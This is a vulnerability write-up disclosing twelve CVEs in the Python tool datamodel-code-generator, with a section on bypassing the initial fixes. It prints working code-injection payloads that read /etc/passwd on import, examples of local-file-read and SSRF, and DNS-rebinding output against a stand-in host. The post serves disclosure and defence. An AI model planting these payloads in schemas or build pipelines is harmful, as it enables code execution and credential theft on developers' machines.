---
title: "Twelve CVEs in datamodel-code-generator: seven from the code, five from the patch"
summary: "datamodel-code-generator, a Python code generator pulling roughly 14.5 million downloads a month on PyPI, shipped twelve CVEs: code injection and code execution on import, SSRF, and arbitrary local file read. Seven came from reading the source. Five more came from bypassing the fixes. Here is how an attacker-controlled schema turns a model generator into remote code execution, and why patching a sink is not the same as patching a class."
date: "2026-06-19"
tags:
  - security
  - supply-chain
  - rce
  - code-injection
  - ssrf
  - path-traversal
  - python
  - cve
draft: true
images: ['/static/images/datamodel-cves.jpg']
author:
  - name: Hamza Haroon
---

![Twelve CVEs in datamodel-code-generator: six RCE, three SSRF, two arbitrary file reads, one header leak](/static/images/datamodel-cves.jpg)

After [six CVEs in `swagger-typescript-api`](https://thegriffyn.me/blog/oss/six-cves-in-swagger-typescript-api), I wanted to know whether the same patterns held in a different language and a different ecosystem. I pointed the same methodology at [`datamodel-code-generator`](https://pypi.org/project/datamodel-code-generator/), the Python tool that turns a JSON Schema, OpenAPI, GraphQL, or XSD document into Python data models. The first pass produced seven advisories: code injection, code execution on import, and server-side request forgery. The maintainer fixed all seven and cut a security release. Then I came back and attacked the fixes, and the patches gave up five more CVEs. Twelve in total, all published with assigned CVEs at [github.com/koxudaxi/datamodel-code-generator/security](https://github.com/koxudaxi/datamodel-code-generator/security).

Start with the scale, because it is what makes this matter. `datamodel-code-generator` is one of the most heavily used model generators in the Python ecosystem. At the time of writing it pulls roughly **14.5 million downloads a month** on PyPI, about 3.6 million a week and more than 600,000 on a single day, which works out to well over 170 million downloads a year. It is recommended in the FastAPI documentation, depended on by a long tail of API and SDK tooling, and wired into countless build pipelines that turn a JSON Schema, OpenAPI, GraphQL, or XSD document into typed `pydantic`, `dataclasses`, `msgspec`, or `TypedDict` models. The appeal is the same as every codegen tool: point it at a schema and get safe-looking Python back. That reach is exactly what turns one malicious schema into a supply-chain problem. Every team that generated models from a spec they did not author, then imported the result, was one crafted string away from running the schema author's code.

## The first seven

| CVE | Finding | CVSS | Severity |
|---|---|---|---|
| [CVE-2026-54621](https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-j884-q54q-mmx3) | Code injection via unescaped carriage return in GraphQL Union description | 7.8 | High |
| [CVE-2026-54653](https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-386q-5hp3-95m9) | Code injection via attacker-controlled `default_factory` schema field | 8.8 | High |
| [CVE-2026-54654](https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-wjv6-jcfj-mf9r) | Code injection via unescaped carriage return in `--extra-template-data` `comment` | 7.8 | High |
| [CVE-2026-54655](https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-m34r-v34r-rf9q) | Code execution on import via `x-python-type` JSON-Schema extension | 7.8 | High |
| [CVE-2026-54656](https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-8m8r-38jm-f355) | Code execution on import via unescaped `validators` in `--extra-template-data` | 7.8 | High |
| [CVE-2026-54690](https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-954p-556p-r752) | SSRF via JSON-Schema `$ref` to an HTTP URL, fetched by default | 8.2 | High |
| [CVE-2026-54691](https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-rfr2-mq9m-x2qx) | SSRF via `--url`: no host or IP validation, follows redirects | 8.2 | High |

## The five that came from attacking the fixes

| CVE | Finding | CVSS | Severity |
|---|---|---|---|
| [CVE-2026-55415](https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-5578-w22f-pfx9) | Code injection via `x-python-import` / `customTypePath` in generated import statements | 7.5 | High |
| [CVE-2026-55389](https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-8359-h9fx-j6v9) | Arbitrary local file read via JSON-Schema `$ref` (`file://` and `../`), bypassing `--no-allow-remote-refs` | 7.5 | High |
| [CVE-2026-55390](https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-442q-2j6p-642g) | Arbitrary local file read via XSD `schemaLocation` path traversal, with no remote-ref gate | 7.5 | High |
| [CVE-2026-55391](https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-vx7x-vcc2-c44g) | SSRF protection bypass via DNS rebinding | 7.5 | High |
| [CVE-2026-55403](https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-r5vv-ff45-prp2) | Authorization and request headers leaked to a cross-origin redirect target | 3.7 | Low |

> **Affected:** `datamodel-code-generator` through the 0.61.0 line, depending on the finding.
> **Fixed:** all twelve are addressed in current releases.
> **Action:** update to the latest `datamodel-code-generator`. If you generate models from third-party, vendored, or user-supplied schemas, or you run the tool in CI on specs you did not author, update now and audit any generated `.py` you have already committed for statements sitting at module or class-body scope.

## Why a code generator is a better target than the code it generates

The output of a code generator is source code that someone is about to import and run. If the person who wrote the schema controls a string that lands in a code position without escaping, they control what executes. The schema stops being data and becomes code.

`datamodel-code-generator` builds its Python output through Jinja2 templates and, in a few places, through raw f-string interpolation in the model layer. Jinja2 does not escape for Python the way it would for HTML, and the model layer mostly relies on `repr()` to quote values safely. The interesting positions are the ones where neither protection applies: a value dropped into a `#` comment, a value interpolated as a bare expression rather than `repr()`-quoted, an extension value forwarded verbatim as a type annotation or an import path. Every finding here is one of those positions. The only question for each is which code position, and what runs when Python reaches it.

## The carriage return that ends a comment

The cleanest of the first seven is also the smallest. The Union templates render a schema's description into a Python comment like this, in `UnionTypeStatement.jinja2` and its two siblings:

```jinja2
# {{ description | replace('\n', '\n# ') }}
```

The filter rewrites every line feed into a line feed plus a new `# ` so multi-line descriptions stay commented. It handles `\n`. It does nothing about a bare carriage return. This is the learning point worth keeping: Python's tokenizer treats a lone `\r` as a physical-line terminator exactly like `\n` (the language reference lists CR, LF, and CRLF as the three physical-line endings), and `\r` is not in the set anyone thinks to escape. The comment ends at the carriage return and whatever follows is parsed as Python.

A GraphQL union with this description, in the regular-string form so the `\r` survives into the on-disk source as a real carriage return:

```graphql
"Color union\ropen('/tmp/loot','w').write(open('/etc/passwd').read())"
union Color = Red | Green
```

The generated module, with the carriage return shown where it falls, comes out as:

```python
# Color union
open('/tmp/loot', 'w').write(open('/etc/passwd').read())
type Color = Union[
    'Green',
    'Red',
]
```

The text up to the carriage return stays a comment. The `open(...)` call lands at module scope, so it runs the moment anything imports the generated file, with no class to construct and no function to call. It reads `/etc/passwd` and copies it out. A benign description produces a clean single-line comment and nothing else.

The same carriage-return break works through `--extra-template-data`, where a `comment` value is rendered into six other templates as `# {{ comment }}` with no filter at all (`TypeAliasAnnotation.jinja2`, `TypeAliasType.jinja2`, `TypeStatement.jinja2`, and three `pydantic_v2` templates). A `\r` followed by a four-space indent drops the injected statement straight into the class body next to the real fields, so the model still constructs cleanly and the developer sees no error. The same `comment_safe()` helper that fixes the union description also exists in the codebase, it was simply never applied to these six sites, which is the first preview of the pattern the bypass round turns into a theme.

## The expression that was never quoted

`datamodel-code-generator` quotes almost every field argument through `repr()`, which is the right call. `default_factory` is the exception. In `pydantic_base.py` the factory is interpolated as a bare expression:

```python
# model/pydantic_base.py
if default_factory is not None:
    field_arguments = [f"default_factory={default_factory}", *field_arguments]
```

The same special-case is repeated in two other backends, `model/dataclass.py` and `model/msgspec.py`, each with the tell-tale `f"{k}={v if k == 'default_factory' else repr(v)}"` that explicitly skips `repr()` for this one key. That repetition across three files is the learning point: `repr()` was the project's escaping convention, and `default_factory` was carved out of it three separate times because a factory has to be emitted as a callable expression, not a quoted string. `default_factory` is also in `DEFAULT_FIELD_KEYS`, so a plain schema can set it with no special flag. Set it to an expression that does its work and then returns a real factory:

```json
"default_factory": "(open('/tmp/loot','w').write(open('/etc/passwd').read()), lambda: [])[1]"
```

which generates:

```python
class InjectModel(BaseModel):
    items: list[str] = Field(
        default_factory=(open('/tmp/loot','w').write(open('/etc/passwd').read()), lambda: [])[1]
    )
```

The tuple's first element copies `/etc/passwd` when the class body is evaluated at import. Its second element is an empty-list factory, so `default_factory` ends up holding a valid callable and the model is created with no `SyntaxError`, no `TypeError`, and no warning. The expression ran; the model still looks fine.

## The extensions that were meant to name a type

Two JSON-Schema extensions let a schema author influence the Python that comes out. Both forward their value into a code position.

`x-python-type` lets a schema override the annotation for a field. `_get_python_type_override` in `parser/jsonschema.py` accepts any string, the value is returned by `DataType.type_hint` unchanged, and it is rendered raw as `{{ field.type_hint }}` in every model template. A value of `MyType; open("/tmp/canary","w")` generates:

```python
class InjectTest(BaseModel):
    victim: MyType
    open("/tmp/canary", "w")
```

The detail that makes this reliable is `from __future__ import annotations`, which datamodel-code-generator emits by default. It turns `victim: MyType` into a string annotation that is never evaluated, so `MyType` does not have to exist, while the statement after the semicolon is ordinary class-body code that runs on import. It fires the same way under `pydantic_v2.BaseModel`, `dataclasses.dataclass`, and `typing.TypedDict`.

The `validators` entry in `--extra-template-data` reaches a different sink with the same shape. Each field name is wrapped in single quotes without escaping and rendered into a `@field_validator(...)` decorator. A field value of `v', open('/tmp/canary','w') and 'v` closes the quote and slips an expression into the decorator's arguments:

```python
@field_validator('v', open('/tmp/canary', 'w') and 'v', mode='after')
@classmethod
def path_validator(cls, v: Any, info: ValidationInfo) -> Any:
    return path(v, info)
```

Decorator arguments evaluate when the class is defined, so the `open(...)` runs at import.

## When the generator becomes the request engine

The last two of the first seven do not run in the generated output. They run inside `datamodel-code-generator` while it generates. The HTTP fetch in `http.py` is plain:

```python
response = httpx.get(
    url,
    headers=headers,
    verify=not ignore_tls,
    follow_redirects=True,
    params=query_parameters,
    timeout=timeout,
)
```

No allow-list, no deny-list, no check against private, loopback, or link-local addresses, and `follow_redirects=True`. Two call sites reach this same fetcher: the top-level `--url` input, and any HTTP `$ref` inside a schema routed through `_get_ref_body` in `parser/jsonschema.py`. The `$ref` path is the sharper of the two because the schema author controls the destination, not the operator, and on the default configuration the gate only emitted a deprecation warning before fetching anyway. A loopback listener standing in for an internal service confirmed both. The part worth internalising is the second-order impact: the response body is parsed as a schema and reflected into the generated `.py` as field names and docstrings, so this is not a blind SSRF. Whatever an internal endpoint returns lands in source the developer reads and commits, which turns request forgery into data exfiltration through the generated file.

## Then I attacked the fixes

The maintainer took all seven seriously and shipped a real security release. A `comment_safe()` helper normalized carriage returns in the Union description. Identifier validation was added for the `validators` config and for `x-python-type`. The `default_factory` expression was locked down. A `--allow-remote-refs` option was added so HTTP `$ref` fetching could be turned off, and the HTTP layer learned to resolve hosts, reject private addresses, and re-validate redirect URLs. On paper, the cluster was closed.

So I came back and read the patch instead of the original code. A fix that escapes one sink is not the same as a fix for the class. Five of the patches left a sibling path open, and each open path was its own CVE.

### The import line the escaping never reached

The security release added identifier validation in two places. It added `_validate_dotted_python_identifier_path` for the `validators` config, and an `is_python_type_annotation` check for `x-python-type`. It did not touch `imports.py`, the code that actually builds import statements, which had last changed months before the release. `Import.from_full_path` splits a path on `.` and keeps every other character, including newlines, and `create_line` renders the result verbatim:

```python
# imports.py
split_class_path = class_path.split(".")
return cls(import_=split_class_path[-1], from_=".".join(split_class_path[:-1]) or None)
...
return f"from {from_} import {', '.join(...)}"
```

Two schema-controlled extensions feed this on the default configuration: `x-python-import` (consumed in `get_ref_data_type`) and `customTypePath`, both routed into `Import.from_full_path`. A newline in the value breaks out of the `from ... import ...` line. With a module of `os` and a name of `getcwd\nprint(...)`, the generated module is:

```python
from __future__ import annotations

from os import getcwd

print(*open('/etc/passwd'), file=open('/tmp/loot', 'w'), sep='', end='')
from pydantic import BaseModel
```

The only constraint on the payload is that it contains no `.`, since that is the single character `from_full_path` splits on, and that is trivially satisfied with attribute-free builtins. The statement runs at module scope on import. This is the cleanest illustration of the whole second round: the same release that added one identifier check for `validators` and another for `x-python-type` left the shared `imports.py` sink, reachable by two more extensions, completely untouched. The fix matched the report, not the class.

### The gate that only knew about http

The remote-ref fix gave developers `--no-allow-remote-refs` to stop `$ref` from reaching external resources. It reasoned about `http`. It did not reason about the filesystem. Resolving a `$ref` reads local files with no containment to the input directory, and the gate has a hole in the exact shape of `file://`:

```python
# parser/jsonschema.py
if not resolved_ref.startswith("file://") and self.http_local_ref_path is None:
```

Two things are wrong here, and both are instructive. First, `file://` is explicitly written into the condition as an exception, so a `file://` reference short-circuits the gate entirely and is read through `url2pathname` with no base-path restriction. An absolute path anywhere on disk is opened even with `--no-allow-remote-refs` set. That `file://` is treated as a URL at all comes from `is_url` in `reference.py`, which classifies it alongside `http://`. Second, a plain relative `$ref` takes a different branch that resolves `self.base_path / resolved_ref` with no containment check, so `../../../` climbs out of the project. The HTTP-local branch right next to it does enforce `is_relative_to(base_path)`; these two do not, which is the kind of inconsistency that only shows up when you read the three branches side by side. Place an AWS-shaped secret in a directory outside the project and it comes back through both forms, parsed and folded into the schema and baked verbatim into the generated module:

```python
class Credentials(BaseModel):
    stolen: AwsSecretAccessKey | None = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
```

The control whose entire job is to stop `$ref` from reaching external resources was bypassed by the two reference forms that point at the local disk.

### The parser the gate never covered

The XSD parser is a different code path with no remote-ref gate at all. It resolves `<xs:include>` and `<xs:import>` `schemaLocation` attributes relative to the source file and reads them with only an `is_file()` check:

```python
location = (source_dir / schema_location).resolve()
if location in seen or not location.is_file():
    continue
included_root = self._parse_schema(_read_xml_text(location, self.encoding), location)
```

`.resolve()` collapses `../`, so a `schemaLocation` of `../../secret_zone/leak.xsd` or an absolute path reads outside the project tree. `--no-allow-remote-refs` does not apply, because that gate lives in the JSON-Schema parser and was never extended to XSD. Same primitive as the `$ref` file read, reached through a parser the hardening did not consider.

### The IP check that wasn't pinned to the connection

The SSRF fix resolves the host and rejects private and link-local addresses before fetching. Then it hands the original URL to `httpx`, which performs its own independent DNS lookup to connect. The address that passed validation is never pinned for the connection, which is a textbook time-of-check-to-time-of-use gap. A hostname that resolves to a public address when the guard checks it and to `127.0.0.1` when `httpx` connects walks straight past the guard:

```text
getaddrinfo('rebind.attacker.test') call #1 -> 93.184.216.34   (guard: looks public, passes)
getaddrinfo('rebind.attacker.test') call #2 -> 127.0.0.1        (httpx: connects to internal)
RESULT body: {"x":"INTERNAL_METADATA_TOKEN_42"}
>>> SSRF GUARD BYPASSED via DNS rebinding
```

Demonstrating this deterministically only requires patching `socket.getaddrinfo` so the second lookup returns the internal address, which is the standard way to show a time-of-check-to-time-of-use class without standing up a low-TTL rebinding record. The root cause is structural and sits in plain sight in `http.py`: the guard resolves and checks an address, then hands the hostname to `httpx`, which resolves it independently to connect. The validated address is never the one the socket connects to. Reaching `169.254.169.254` and loopback is back on the table even with private networking disabled. The general lesson is that an SSRF guard has to pin the address it validated to the connection it allows, or it is checking the wrong moment.

### The redirect that kept the credentials

The smaller sibling, and the only Low of the twelve, is in the same redirect path. On each hop, the fetch is re-issued with the same headers regardless of whether the redirect changed origin. A credential the operator scoped to a trusted schema host rides along to wherever the redirect points:

```text
Header received by the REDIRECT TARGET (different origin): Bearer SECRET_TOKEN_FOR_HOST_A
>>> CROSS-ORIGIN AUTH LEAK on redirect
```

Browsers, `requests`, and `httpx` all drop `Authorization` when a redirect crosses origins. This fetch did not, so a 302 from a trusted host to an attacker host hands over the token.

## Disclosure and remediation

All twelve were filed through GitHub's private advisory channel. koxudaxi engaged on every one, fixed the first seven in a security release, then fixed the five that came out of attacking that release, and all twelve are now published with assigned CVEs. The remediations line up one-to-one with the root causes above: normalize line terminators before they reach a comment, validate identifiers before they reach an import or a decorator, pin the validated address to the connection, drop credentials when a redirect changes origin, and bring `file://`, relative `$ref`, and XSD includes under the same containment that already guarded HTTP references.

## The lesson

The first seven were the kind of finding you get from reading source: an unescaped value in a comment, an expression that skipped `repr()`, a fetch with no allow-list. The five that followed were the kind you only get from reading the patch.

A fix that escapes the Union description but not the import line closes a sink, not a class. A gate that blocks `http://` but exempts `file://` and never looks at XSD is a gate around one door of a room with three. An IP check that validates a hostname and then lets the HTTP client resolve it again checks the wrong moment. None of these were careless. They were narrow, and narrow is the natural shape of a fix written against a specific report. The same root cause was still reachable one path over, and the only way to find that was to assume the patch was incomplete and go looking for the path it missed.

Fixing a vulnerability and fixing a vulnerability class are not the same thing. The bypass round is where the difference shows up.

## Who I am

I'm Hamza Haroon ([@thegr1ffyn](https://github.com/thegr1ffyn)), a security researcher working across web application security, open source security and threat intelligence. Twelve CVEs out of one package, seven from reading the code and five from reading the patch, is the kind of result that keeps me coming back to codegen tooling.

If you found this useful, follow along for more write-ups, or get in touch.
